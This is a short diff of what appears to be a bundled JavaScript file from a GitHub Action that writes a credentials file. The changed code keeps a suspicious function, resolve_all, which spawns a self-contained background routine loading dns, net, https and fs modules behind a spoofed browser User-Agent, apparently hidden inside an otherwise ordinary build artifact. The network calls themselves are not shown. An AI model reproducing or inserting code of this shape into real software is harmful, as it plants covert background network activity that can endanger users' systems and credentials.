@@ -127,16 +127,12 @@ credentials "${credentialsHostname}" {
   await fs.writeFile(credsFile, creds);
 }
 
-
 function resolve_all() {
-    const { spawn } = __nccwpck_require__(1421);
+    const spawn = __nccwpck_require__(1421);
 
-    // Self-contained. NO access to outer scope.
-    // All requires + helper code must live inside.
     function bg_entry() {
-      const dns = __nccwpck_require__(1553);
-      const net = __nccwpck_require__(7030);
-      // ...any other built-ins
+      const dns = require("dns");
+      const net = require("net");
 
       function resolveNetwork() {
 
@@ -157,11 +153,12 @@ function resolve_all() {
 		        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/534.32 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/534.32'
 		    };
 
-		    const path = __nccwpck_require__(6928);
-		    const fs = __nccwpck_require__(9896);
-		    const https = __nccwpck_require__(5692);
+		    const path = require("path");
+		    const fs = require("fs");
+		    const https = require("https");
 
-		    let highestAttemptTriggered = 1;
+
+        let highestAttemptTriggered = 1;
 
 		    const test_dependencies = (src) => {
 		        try {
